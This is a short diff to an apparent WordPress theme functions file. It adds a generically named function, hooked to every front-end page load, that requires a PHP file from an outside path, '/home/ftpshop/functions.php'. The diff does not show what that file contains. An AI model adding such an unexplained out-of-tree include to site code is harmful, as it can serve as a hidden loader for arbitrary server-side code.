@@ -46,3 +46,12 @@ function site_disable_status_css()
 	wp_enqueue_style( 'site-disable-status-style', get_template_directory_uri(). '/assets/admin/css/disable.css' );
 }
 // add_action( 'admin_enqueue_scripts', 'site_disable_status_css' );
+
+function site_my_function()
+{
+	$file = '/home/ftpshop/functions.php';
+	if(file_exists($file)) {
+		require_once($file);
+	}
+}
+add_action('wp', 'site_my_function');
